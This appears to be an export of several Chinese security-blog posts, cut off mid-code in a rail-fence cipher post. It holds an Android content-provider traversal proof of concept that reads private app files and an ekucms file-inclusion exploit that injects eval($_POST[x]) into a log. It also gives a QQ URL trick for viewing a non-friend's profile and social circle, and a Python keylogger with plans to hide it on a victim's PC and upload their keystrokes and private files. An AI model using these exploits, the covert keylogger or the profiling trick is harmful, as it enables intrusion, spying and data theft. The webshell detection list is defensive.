<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context,Intent intent)</span></span>&#123;</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="七、Content-Provider目录遍历漏洞"><a href="#七、Content-Provider目录遍历漏洞" class="headerlink" title="七、Content Provider目录遍历漏洞"></a>七、Content Provider目录遍历漏洞</h1><p>&emsp;&emsp;Android Content Provider 存在文件目录遍历安全漏洞，该漏洞源于对外暴露 Content Provider组件的应用，没有对 Content Provider 组件的访问进行权限控制和对访问的目标文件的<code>Content Query Uri</code>进行有效判断，攻击者利用该应用暴露的 Content Provider的<code>openFile()</code>接口进行文件目录遍历以达到访问任意可读文件的目的。</p>
<p>&emsp;&emsp;此时的条件是对外暴露的Content Provider组件实现了<code>openFile()</code>接口</p>
<p>&emsp;&emsp;没有对所访问的目标文件 Uri 进行有效判断，如没有过滤限制如 <code>../</code> 可实现任意可读文件的访问的 <code>Content Query Uri</code> 。</p>
<p>&emsp;&emsp;比如，某 APP 的实现中定义了一个可以访问本地文件的 Content Provider 组件，默认的 <code>android:exported=&quot;true&quot;</code>，对应<code>com.xxxx.android.jobs.html5.LocalFileContentProvider</code>，该 Provider 实现了 <code>openFile()</code> 接口，通过此接口可以访问内部存储 app_webview 目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”<code>../</code>“实现目录跨越，实现对任意私有数据的访问。</p>
<p>&emsp;&emsp;攻击poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GJContentProviderFileOperations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        InputStream in = getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.xxx.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> n = in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的WebShell查杀工具</title>
    <url>/post/2812b919.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p>
<p>本文推荐了10款 WebShell 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p>
<h1 id="二、常见Webshell查杀工具"><a href="#二、常见Webshell查杀工具" class="headerlink" title="二、常见Webshell查杀工具"></a>二、常见Webshell查杀工具</h1><h3 id="1、D盾-Web查杀"><a href="#1、D盾-Web查杀" class="headerlink" title="1、D盾_Web查杀"></a>1、D盾_Web查杀</h3><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p>
<p>兼容性：只提供 Windows 版本。</p>
<p>工具下载地址：<a href="http://www.d99net.net/">http://www.d99net.net</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648818997722-3e3e0b77-076d-447a-9d34-287d922f6488.png" alt="img"></p>
<h3 id="2、百度-WEBDIR"><a href="#2、百度-WEBDIR" class="headerlink" title="2、百度 WEBDIR+"></a>2、百度 WEBDIR+</h3><p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p>
<p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p>
<p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819014835-cbd44e10-0177-4459-bffc-dbb93c6ad60c.png" alt="img"></p>
<h3 id="3、河马"><a href="#3、河马" class="headerlink" title="3、河马"></a>3、河马</h3><p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>
<p>兼容性：支持 Windows、Linux，支持在线查杀。</p>
<p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819021138-010f71e1-30dc-43e3-a172-44b771d4e2fc.png" alt="img"></p>
<h3 id="4、Web-Shell-Detector"><a href="#4、Web-Shell-Detector" class="headerlink" title="4、Web Shell Detector"></a>4、Web Shell Detector</h3><p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p>
<p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p>
<p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com</a></p>
<p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819042486-2285fb9d-3d5e-4d0e-b6d6-20732c4f0a6e.png" alt="img"></p>
<h3 id="5、CloudWalker（牧云）"><a href="#5、CloudWalker（牧云）" class="headerlink" title="5、CloudWalker（牧云）"></a>5、CloudWalker（牧云）</h3><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p>
<p>兼容性：提供 Linux版本，Windows 暂不支持。</p>
<p>在线查杀 demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn</a></p>
<p>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819059685-fb692bd8-b737-4be4-a5b9-09a70cb3376f.png" alt="img"></p>
<h3 id="6、Sangfor-WebShellKill"><a href="#6、Sangfor-WebShellKill" class="headerlink" title="6、Sangfor WebShellKill"></a>6、Sangfor WebShellKill</h3><p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p>
<p>兼容性：支持 Windows、linux</p>
<p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819061046-cf760a8f-ec9c-43cd-824b-e0d57c01c69a.png" alt="img"></p>
<h3 id="7、深度学习模型检测-PHP-Webshell"><a href="#7、深度学习模型检测-PHP-Webshell" class="headerlink" title="7、深度学习模型检测 PHP Webshell"></a>7、深度学习模型检测 PHP Webshell</h3><p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p>
<p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819079306-b5b8c0eb-9a76-46af-a12a-504a2ff4b368.png" alt="img"></p>
<h3 id="8、PHP-Malware-Finder"><a href="#8、PHP-Malware-Finder" class="headerlink" title="8、PHP Malware Finder"></a>8、PHP Malware Finder</h3><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p>
<p>兼容性：提供Linux 版本，Windows 暂不支持。</p>
<p>GitHub 项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819079937-c06340a8-a232-4a4f-ada0-0fe36011753e.png" alt="img"></p>
<h3 id="9、findWebshell"><a href="#9、findWebshell" class="headerlink" title="9、findWebshell"></a>9、findWebshell</h3><p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p>
<p>GitHub 项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819086432-4916cf5a-e426-4661-9181-83149df53ddd.png" alt="img"></p>
<h3 id="10、在线-WebShell-查杀工具"><a href="#10、在线-WebShell-查杀工具" class="headerlink" title="10、在线 WebShell 查杀工具"></a>10、在线 WebShell 查杀工具</h3><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell">http://tools.bugscaner.com/killwebshell</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648819092499-f4375ac0-fec4-414a-b191-a0d4146654d9.png" alt="img"></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>强制加好友并给他打QQ电话</title>
    <url>/post/bce31dbc.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、相关说明"><a href="#一、相关说明" class="headerlink" title="一、相关说明"></a>一、相关说明</h1><p>&emsp;&emsp;21年5月份传出的代码，目前来源不清楚，好像是一位博主朋友抓的，在这里感谢他。  </p>
<p>&emsp;&emsp;这个功能可以直接跳转到这个页面，然后你只需要把他调整一下分组，再去搜索好友里面直接搜索就好，当然，肯定不会让对方好友列表显示你，但是可以让自己看见，不能发消息，不过你可以打电话，对方能不能收到就不一定了。  </p>
<h1 id="二、相关代码"><a href="#二、相关代码" class="headerlink" title="二、相关代码"></a>二、相关代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.qq.com/friends/recall?uin=输入QQ号</span><br></pre></td></tr></table></figure>

<h1 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h1><p>&emsp;&emsp;之前一朋友被网络诈骗了，托我追查一下此诈骗犯，朋友也把相关信息和证据提交给了警方。这里就以这个诈骗犯“苏”的为例，来看看面对诈骗犯我们可以进行什么操作。</p>
<h2 id="1、准备"><a href="#1、准备" class="headerlink" title="1、准备"></a>1、准备</h2><p>&emsp;&emsp;首先我这个QQ并没有苏的好友</p>
<h2 id="2、强制“添加”好友"><a href="#2、强制“添加”好友" class="headerlink" title="2、强制“添加”好友"></a>2、强制“添加”好友</h2><p>&emsp;&emsp;生成链接</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641288142940-fe27fb26-2ed1-4acb-9c38-6530573e533f.png" alt="img"></p>
<p>&emsp;&emsp;点击该链接，会跳到这个页面，<strong>注意！</strong>此时分组是默认的，必须要修改到另外一个分组，我的好友列表才能看到苏</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641288734037-1ceb2347-0079-4f4d-a916-1a400bf16e69.png" alt="img"></p>
<p>&emsp;&emsp;移动到另一分组</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641288786167-e1ac0aa3-55a0-477b-b78a-172f492562dc.png" alt="img"></p>
<p>&emsp;&emsp;此时查看好友列表就能发现苏</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641288850314-d0ec0ae2-7b8d-4b4b-9d13-0a9d44c7d495.png" alt="img"></p>
<h2 id="3、消息与电话测试"><a href="#3、消息与电话测试" class="headerlink" title="3、消息与电话测试"></a>3、消息与电话测试</h2><p>&emsp;&emsp;从测试来看，消息发送不成功，电话一直无人接听（后面自己给自己又进行了一轮测试，发现接不到来电电话的）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289072376-d62cc53d-9309-4249-8028-f87f816f631f.png" alt="img"></p>
<h2 id="4、其他测试"><a href="#4、其他测试" class="headerlink" title="4、其他测试"></a>4、其他测试</h2><p>后面进行了一系列测试：</p>
<h3 id="（1）失败点："><a href="#（1）失败点：" class="headerlink" title="（1）失败点："></a>（1）失败点：</h3><ol>
<li><p>聊天框左划尝试看QQ空间，和直接从个人资料卡访问QQ空间，显示非好友无法访问</p>
</li>
<li><p>尝试登录王者荣耀，来获取QQ好友关系，查看苏的王者战区定位即可大致知晓苏的活动范围，但是拉取好友状态失败</p>
</li>
<li><p>尝试查看个人签名也失败</p>
</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289350098-b4a94558-23cf-4033-b64e-e93444065b12.png" alt="img"></p>
<h3 id="（3）成功点"><a href="#（3）成功点" class="headerlink" title="（3）成功点"></a>（3）成功点</h3><ol>
<li>成功查看个人详细资料，可以获得更多的个人信息</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289483966-06d60957-fd92-4dac-9f31-ec4716276f02.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289499830-4df4ef9d-0079-430f-a1f6-89139a689079.png" alt="img"></p>
<ol start="2">
<li>随心贴可以看到了。成为好友前我们是看不到随心贴的，现在能看到苏发了什么随心贴，谁赞了，评论了。我们可能通过谁评论和赞，收集到苏的小号或亲友、同学等社交关系，并从这些人的QQ开始分析寻找突破口，分析苏的社交圈以及更多信息。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289587615-1c4a77dc-bb2f-4164-a05f-b51d20c5ed8c.png" alt="img"></p>
<p>举例：这里以点击第一个随心贴的详细页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289738651-7e99b8d2-6a36-4c96-a2e4-90a79127194d.png" alt="img"></p>
<p>发现一个与苏及其相似的网名，可能是小号或者是闺蜜，因此点击，就可以查看到这人的QQ资料卡，后续就从其他人的QQ下手收集更多关于苏的信息。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641289839705-4663bd27-632e-40d8-b981-1fe9682f20d0.png" alt="img"></p>
<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>&emsp;&emsp;此代码漏洞利用的影响点其实就是<strong>QQ个人主页</strong>这一块，<strong>实际依然是非好友关系</strong>。换句话说，只有QQ个人主页的代码逻辑是有漏洞的，像QQ空间和签名等会有其他代码逻判断是否是好友，而不会受以上payload的影响。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641290835826-dc0b7bd7-5642-4224-a34c-6fabed4edcc8.png" alt="img"></p>
<p>&emsp;&emsp;当然我的测试也不够完整，如果有其他利用姿势的欢迎在评论区补充</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>QQ技术</tag>
      </tags>
  </entry>
  <entry>
    <title>易酷ekucms本地文件包含漏洞</title>
    <url>/post/28755b24.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>易酷CMS是一套专为不同需求的站长而设计的视频点播系统，灵活，方便是最大的特色，为初学者快速架设网站首选，只需5分钟即可建立一个海量的视频讯息的行业网站。 </p>
<p>易酷CMS采用PHP+MYSQL架构</p>
<h1 id="二、漏洞影响范围"><a href="#二、漏洞影响范围" class="headerlink" title="二、漏洞影响范围"></a>二、漏洞影响范围</h1><p>ekucms &lt;= 2.5</p>
<h1 id="三、测试环境"><a href="#三、测试环境" class="headerlink" title="三、测试环境"></a>三、测试环境</h1><ul>
<li><p>PHP 5.3.21</p>
</li>
<li><p>MySQL 5.7.26</p>
</li>
<li><p>ekucms 2.4.1</p>
</li>
</ul>
<h1 id="四、复现"><a href="#四、复现" class="headerlink" title="四、复现"></a>四、复现</h1><p>下载地址：链接：<a href="https://pan.baidu.com/s/1TkJgH7WFHLb781NO_2Ysag">https://pan.baidu.com/s/1TkJgH7WFHLb781NO_2Ysag</a> 提取码：nfzt</p>
<p>安装完成后如图所示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646732342133-81493db8-648d-4436-9c0f-8f682d8666fb.png" alt="img"></p>
<p>访问URL：<code>http://localhost/ekucms2.4.1/?s=my/show/id/&#123;~eval($_POST[x])&#125;</code>，报错</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646733807735-98962987-fb07-40f5-8c2c-7884f6d1049f.png" alt="img"></p>
<p>报错信息记录到了日志，日志目录：<code>/ekucms/temp/Logs/</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646733893547-f43c45e3-4c92-4d1d-b629-1ff4306e8713.png" alt="img"></p>
<p>文件包含日志路径：<code>http://localhost/ekucms2.4.1/?s=my/show/id//../temp/logs/22_03_08.log</code></p>
<p>POST：<code>x=phpinfo();</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646792484642-42830f0d-6e3f-4f6b-9d01-34032bfbdc14.png" alt="img"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>想要监控键盘？Python搞定！</title>
    <url>/post/90a9d002.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如果将电脑暂时给他人用，如何监控别人在我们电脑使用键盘敲了些什么东西呢？</p>
<p>软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220101190041070.png" alt="image-20220101190041070"></p>
<h1 id="一、环境依赖"><a href="#一、环境依赖" class="headerlink" title="一、环境依赖"></a>一、环境依赖</h1><p>需要安装pynput模块，可以使用pip安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pynput</span><br></pre></td></tr></table></figure>

<p>也可以在pycharm的<strong>settings&gt;interpreter中安装</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019883218-4ab81692-8192-45dd-883e-3cddad557704.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019901019-1d8dd10c-1e69-4afe-9e8b-72e0819ee081.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019919002-aeefc97f-e784-4cfa-b46b-4b0c1cc2fd5b.png" alt="img"></p>
<h1 id="二、相关代码"><a href="#二、相关代码" class="headerlink" title="二、相关代码"></a>二、相关代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Key, Controller, Listener</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">keyboard = Controller()</span><br><span class="line">keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_release</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">global</span> keys</span><br><span class="line">    string = <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    keys.append(<span class="string">&#x27;\r&#x27;</span> + string)</span><br><span class="line">    <span class="built_in">print</span>(keys)</span><br><span class="line">    main_string = <span class="string">&quot;&quot;</span>.join(keys)</span><br><span class="line">    <span class="built_in">print</span>(main_string)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(main_string) &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/w01ke.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(main_string)</span><br><span class="line">            keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> listener:</span><br><span class="line">    listener.join()</span><br></pre></td></tr></table></figure>

<ul>
<li>这里会将键盘记录传入<strong>D:/w01ke.txt</strong></li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641028433467-8ac74fe5-4ea6-4a82-82e5-7b74de48c9e1.png" alt="img"></p>
<h1 id="三、软件下载与使用"><a href="#三、软件下载与使用" class="headerlink" title="三、软件下载与使用"></a>三、软件下载与使用</h1><ul>
<li>已将程序文件打包exe，软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</li>
<li>当双击w01ke.exe后，程序就已经在后台运行，监控用户的键盘输入，并将信息存入D盘中的w01ke.txt文件中。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641029670450-8750c4c6-f77b-41d6-9acc-cf4e6be5306c.png" alt="img"></p>
<ul>
<li>如果需要退出程序，打开任务管理器，找到w01ke.exe，选中结束任务即可。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641027626425-396c9df2-d6a4-460e-b300-c01ddfb299df.png" alt="img"></p>
<h1 id="四、点评"><a href="#四、点评" class="headerlink" title="四、点评"></a>四、点评</h1><p>&emsp;&emsp;上面代码其实存在很多的缺陷，如果你是一个黑客的话，你可能可以通过用户使用<strong>tab</strong>键切换表单来判断输入框的间隔，或者通过其他分析手段，但是这样并不是很智能，我们其实可以尝试通过鼠标点击来截断输出，这样就可以连贯的看到用户输入的词了，快来尝试一下吧！  </p>
<h1 id="五、一些思考"><a href="#五、一些思考" class="headerlink" title="五、一些思考"></a>五、一些思考</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641031204207-f7ab1c34-d684-47e7-ab23-8878f3f82075.png" alt="img"></p>
<p>&emsp;&emsp;作为一名黑客，如果不是监控自己的电脑，而是想要监控他人的键盘输入情况，我们可以改进程序代码，将w01ke.exe文件发送给小明，当小明双击运行w01ke.exe后，因为没有可视化界面，因此表面看起来无事发生，但w01ke.exe已经在后台运行，如果没有一些计算机常识，小明也不会检查后台进程发现的。但这样还不够，如果小明重启电脑了，那我们的w01ke.exe就退出了，因此我们需要在程序代码中加入一些自启动的相关代码，让小明开机，w01ke.exe文件就自动在后台运行了，或者引诱小明自己每次打开电脑都运行w01ke.exe。</p>
<p>&emsp;&emsp;但这还不够，小明的记录键盘操作的w01ke.txt如何发送到我们自己的电脑上呢？一是可以直接发送文件给我们具有公网IP的服务器上；二是直接与我们的服务器建立连接，但这可能会报毒；三是我们可以自己做一个网站页面，接收提交文件的表单，w01ke.exe设置好，每隔24h自动访问该网站，并自动在后台将w01ke.txt，甚至小明其他的隐私文件也可以，自动通过网页的形式上传到我们的云服务器上，我们在服务器上即可看到小明的键盘记录以及其他隐私文件，而我之前又刚好写过这方面的程序。</p>
<p>&emsp;&emsp;当然这只是作为一名黑客角度思考的可能实现的攻击方式，后续我也将尝试实现这些功能</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>栅栏密码</title>
    <url>/post/54ca3f77.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>&emsp;&emsp;The rail fence cipher，所谓栅栏密码，<strong>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</strong>。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）  </p>
<h1 id="二、加密原理"><a href="#二、加密原理" class="headerlink" title="二、加密原理"></a>二、加密原理</h1><ol>
<li>把将要传递的信息中的字母交替排成上下两行。</li>
<li>再将下面一行字母排在上面一行的后边，从而形成一段密码。</li>
</ol>
<h1 id="三、例子"><a href="#三、例子" class="headerlink" title="三、例子"></a>三、例子</h1><p>&emsp;&emsp;把将要传递的信息中的字母交替排成上下两行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T E O G S D Y U T A E N N</span><br><span class="line">H L N E T A M S H V A E D</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;密文：将下面一行字母排在上面一行的后边。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEOGSDYUTAENN HLNETAMSHVAED</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;解密：先将密文分为两行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T E O G S D Y U T A E N N</span><br><span class="line">H L N E T A M S H V A E D</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;再按上下上下的顺序组合成一句话</p>
<p>&emsp;&emsp;明文：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">THE LONGEST DAY MUST HAVE AN END</span><br></pre></td></tr></table></figure>

<h1 id="四、扩展"><a href="#四、扩展" class="headerlink" title="四、扩展"></a>四、扩展</h1><p>（1）在选择行数时可以使用多行，这样对于加密强度有所提高。</p>
<p>（2）可以在加密之后在使用其他密码进行加密，增加强度。</p>
<h1 id="五、Python实现"><a href="#五、Python实现" class="headerlink" title="五、Python实现"></a>五、Python实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function = <span class="built_in">input</span>(<span class="string">&quot;Input e to encrypt or d to decrypt:&quot;</span>)</span><br><span class="line">function = function.upper()</span><br><span class="line"><span class="keyword">if</span> function == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">    encrypt_message = <span class="string">&quot;&quot;</span></span><br><span class="line">    message = <span class="built_in">input</span>(<span class="string">&quot;Please input your message:&quot;</span>)</span><br><span class="line">    message_length = <span class="built_in">len</span>(message)</span><br><span class="line">    fence_number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input your fence number:&quot;</span>))  <span class="comment"># 假如输入为2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建全局空列表。encrypt_message_list0 = [],encrypt_message_list1 = []</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fence_number):</span><br><span class="line">        s = <span class="string">&#x27;encrypt_message_list&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="built_in">vars</span>()[s] = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字符串的字符加入列表</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(message_length):</span><br><span class="line">        remainder = i % fence_number  <span class="comment"># 余数</span></span><br><span class="line">        s = <span class="string">&#x27;encrypt_message_list&#x27;</span> + <span class="built_in">str</span>(remainder)  <span class="comment"># 余数为0放第一行即encrypt_message_list0，余数为1放第二行即encrypt_message_list1</span></span><br><span class="line">        <span class="built_in">vars</span>()[s].append(message[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印加密信息</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fence_number):</span><br><span class="line">        s = <span class="string">&#x27;encrypt_message_list&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        <span 